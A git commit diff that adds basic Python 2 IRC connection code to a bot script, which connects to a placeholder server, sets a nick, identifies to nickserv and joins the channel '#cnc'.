c05758a49e6a6f38765c014c4722b193374eaf9a
Jackson <samorizu@users.noreply.github.com>
2014-03-07 14:42:24 -0500

    Added server connection code.

--- bot.py
+++ bot.py
@@ -18,3 +18,16 @@ import os
 server = "server"
 channel = "#cnc"
 botnick = "cncnick"
+
+
+
+
+#THIS SECTION IS FOR CONNECTION TO THE SERVER
+#Connecting to the IRC Server
+irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #defines the socket
+print "connecting to: "+server
+irc.connect((server, 6667))  #connects to the server
+irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n")  #user authentication
+irc.send("NICK "+ botnick +"\n")  #sets nick
+irc.send("PRIVMSG nickserv :iNOOPE\r\n")  #auth
+irc.send("JOIN "+ channel +"\n")  #join the channel
